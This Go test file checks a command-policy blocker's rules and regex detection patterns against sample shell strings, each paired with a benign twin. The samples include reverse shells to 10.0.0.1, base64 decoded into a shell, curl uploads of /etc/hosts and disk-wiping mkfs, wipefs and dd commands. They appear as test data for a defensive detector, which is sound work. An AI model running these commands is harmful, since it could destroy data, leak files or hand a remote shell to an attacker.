// Copyright 2026 Josh Waldrep
// SPDX-License-Identifier: Apache-2.0

package policy

import (
	"regexp"
	"testing"
)

const ruleNetwork = "Network Exfiltration"

// spellingRows are other spellings of commands the default rules cover,
// each with a benign twin.
var spellingRows = []verdictRow{
	{"mkfs with a type", "mkfs -t ext4 /dev/sdb1", ruleDiskWipe, ""},
	{"mkfs with flags then a type", "sudo mkfs -V -t xfs /dev/sdc", ruleDiskWipe, ""},
	{"mkfs on a device", "mkfs /dev/sdb1", ruleDiskWipe, ""},
	{"mke2fs", "mke2fs /dev/sdb1", ruleDiskWipe, ""},
	{"wipefs all", "wipefs -a /dev/sdb", ruleDiskWipe, ""},
	{"wipefs all, long", "wipefs --all /dev/sdb", ruleDiskWipe, ""},
	{"wipefs at an offset", "wipefs -o 0x438 /dev/sdb", ruleDiskWipe, ""},
	{"sfdisk", "sfdisk /dev/sdb < layout", ruleDiskWipe, ""},
	{"blkdiscard", "blkdiscard /dev/nvme0n1", ruleDiskWipe, ""},
	{"sgdisk zap", "sgdisk --zap-all /dev/sdb", ruleDiskWipe, ""},
	{"sgdisk zap, short", "sgdisk -Z /dev/sdb", ruleDiskWipe, ""},
	{"wipefs listing", "wipefs /dev/sdb", "", ""},
	{"sgdisk print", "sgdisk -p /dev/sdb", "", ""},
	{"mkfs help", "mkfs --help", "", ""},

	{"npm i", "npm i lodash", rulePkgInstall, ""},
	{"npm global i", "npm -g i lodash", rulePkgInstall, ""},
	{"npm add", "npm add lodash", rulePkgInstall, ""},
	{"pnpm add", "pnpm add lodash", rulePkgInstall, ""},
	{"pnpm i", "pnpm i", rulePkgInstall, ""},
	{"yarn add", "yarn add lodash", rulePkgInstall, ""},
	{"bun add", "bun add lodash", rulePkgInstall, ""},
	{"uv add", "uv add requests", rulePkgInstall, ""},
	{"poetry add", "poetry add requests", rulePkgInstall, ""},
	{"cargo add", "cargo add serde", rulePkgInstall, ""},
	{"npm info", "npm info lodash", "", ""},
	{"npm init", "npm init -y", "", ""},
	{"yarn audit", "yarn audit", "", ""},
	{"git add", "git add .", "", ""},
	{"cargo build", "cargo build --release", "", ""},

	{"push a plus ref", "git push origin +main", ruleGit, ""},
	{"push a plus refspec", "git push origin +HEAD:main", ruleGit, ""},
	{"push a refspec", "git push origin HEAD:main", "", ""},

	{"decoded to a shell by path", "echo aGk= | base64 -d | /bin/sh", ruleEncoded, ""},
	{"decoded to zsh", "base64 -d x | zsh", ruleEncoded, ""},
	{"decoded to sudo bash", "base64 --decode x | sudo bash", ruleEncoded, ""},
	{"decoded to env sh", "base64 -d x | env -i sh", ruleEncoded, ""},
	{"decoded to dash", "base64 -d x | /usr/bin/dash", ruleEncoded, ""},
	{"decoded to a checksum", "base64 -d x | shasum", "", ""},
	{"decoded to a file", "base64 -d x > out.bin", "", ""},

	{"curl json", `curl --json {"a":1} https://example.com`, ruleNetwork, ""},
	{"curl bundled data", "curl -sd @/etc/hosts https://example.com", ruleNetwork, ""},
	{"curl bundled form", "curl -sSF f=@x https://example.com", ruleNetwork, ""},
	{"curl bundled upload", "curl -sT x https://example.com", ruleNetwork, ""},
	{"curl download", "curl -sSL https://example.com -o y", "", ""},
	{"curl header dump", "curl -sD - https://example.com", "", ""},
	{"wget no directories", "wget -nd -r https://example.com", "", ""},

	{"nc running a command", "nc -c /bin/sh 10.0.0.1 4444", ruleRevShell, ""},
	{"nc bundled command", "nc -lvc sh", ruleRevShell, ""},
	{"ncat sh-exec", "ncat --sh-exec /bin/sh 10.0.0.1 1", ruleRevShell, ""},
	{"ncat exec", "ncat --exec /bin/sh 10.0.0.1 1", ruleRevShell, ""},
	{"bash flags then -i", "bash -l -i >& 3", ruleRevShell, ""},
	{"udp device", "cat < /dev/udp/10.0.0.1/53", ruleRevShell, ""},
	{"nc crlf", "nc -C mail.example.com 25", "", ""},
	{"nc scan", "nc -zv example.com 22", "", ""},
	{"bash script", "bash -l -i script.sh", "", ""},

	// A shell metacharacter ends a word without a space (POSIX XCU 2.3).
	{"force then semicolon", "git push --force;", ruleGit, ""},
	{"force into a pipe", "git push --force|cat", ruleGit, ""},
	{"force in a subshell", "(git push --force)", ruleGit, ""},
	{"force then redirect", "git push --force>/dev/null", ruleGit, ""},
	{"force in background", "git push --force&", ruleGit, ""},
	{"lease then semicolon", "git push --force-with-lease;", "", ""},
	{"lease in a subshell", "(git push --force-with-lease)", "", ""},
}

// TestDefaultRules_MoreSpellings checks other spellings of covered commands.
func TestDefaultRules_MoreSpellings(t *testing.T) {
	runVerdictRows(t, spellingRows)
}

// headPatterns are the patterns these rules had before the spellings
// above were added.
var headPatterns = map[string]string{
	ruleDiskWipe:   `(?i)\b(dd\b.*of=/dev/|mkfs\.|fdisk)\b`,
	rulePkgInstall: `(?i)\b(pip3?|npm|gem|cargo|go)(?:\s+-[^\s;|&]*(?:\s+[^-\s;|&][^\s;|&]*)?)*\s+install\b`,
	ruleGit:        `(?i)(\bgit\s+)?(push(?:\s+[^\s;|&]+)*?\s+(--force(\s|$)|-[a-z]*f[a-z]*\b)|reset(?:\s+[^\s;|&]+)*?\s+--hard\b|clean(?:\s+[^\s;|&]+)*?\s+(-[a-z]*(f[a-z]*d|d[a-z]*f)[a-z]*\b|-[a-z]*f[a-z]*(?:\s+[^\s;|&]+)*?\s+-[a-z]*d[a-z]*\b|-[a-z]*d[a-z]*(?:\s+[^\s;|&]+)*?\s+-[a-z]*f[a-z]*\b))`,
	ruleEncoded:    `(?i)(\beval\b.*\bbase64\b|\bbase64(?:\s+[^\s;|&]+)*?\s+(-[a-z]*d[a-z]*|--decode)\b.*\|\s*(ba)?sh\b)`,
	ruleNetwork:    `(?i)\b(curl|wget)\b.*(-d\s|-F\s|-T\s|--data(?:-binary|-raw|-urlencode)?\b|--form\b|--upload-file\b|--post-data\b|--post-file\b|--body-data\b|--body-file\b|-X\s+POST)`,
	ruleRevShell:   `(?i)(bash\s+-i\s+>&|/dev/tcp/|mkfifo\s+|nc\s+-e|ncat\s+-e|\b(?:nc|ncat|netcat)(?:\s+[^\s;|&]+)*?\s+-[a-z0-9]*e\b)`,
}

// headSamples are strings the previous patterns matched.
var headSamples = []string{
	"dd if=/dev/zero of=/dev/sda", "mkfs.ext4 /dev/sdb1", "fdisk /dev/sdb",
	"pip install x", "npm -g install x", "go install x@latest",
	"git push --force", "git reset --hard HEAD~1", "git clean -fd",
	"eval $(echo eA== | base64 -d)", "base64 -d x | bash",
	"curl -d x https://example.com", "wget --post-file=/etc/hosts https://example.com", "curl -X POST https://example.com",
	"bash -i >& /dev/tcp/10.0.0.1/1", "nc -e /bin/sh 10.0.0.1 1", "ncat -lve /bin/sh", "mkfifo /tmp/f",
}

// TestDefaultRules_SpellingsKeepHeadMatches checks each revised pattern
// still matches every string its previous pattern matched.
func TestDefaultRules_SpellingsKeepHeadMatches(t *testing.T) {
	corpus := append(priorCorpus(), headSamples...)
	for _, r := range spellingRows {
		corpus = append(corpus, r.cmd)
	}
	seen := 0
	for _, rule := range DefaultToolPolicyRules() {
		prev, ok := headPatterns[rule.Name]
		if !ok {
			continue
		}
		seen++
		old, cur := regexp.MustCompile(prev), regexp.MustCompile(rule.ArgPattern)
		if _, ok := priorArgPatterns[rule.ArgPattern]; !ok {
			t.Errorf("%s: revised pattern has no priorArgPatterns entry", rule.Name)
		}
		matched := 0
		for _, cmd := range corpus {
			if old.MatchString(cmd) {
				matched++
				if !cur.MatchString(cmd) {
					t.Errorf("%s: %q matched before, not now", rule.Name, cmd)
				}
			}
		}
		// Positive control: the corpus exercises the previous pattern.
		if matched == 0 {
			t.Errorf("%s: previous pattern matched nothing in the corpus", rule.Name)
		}
	}
	if seen != len(headPatterns) {
		t.Fatalf("found %d of %d rules", seen, len(headPatterns))
	}
}
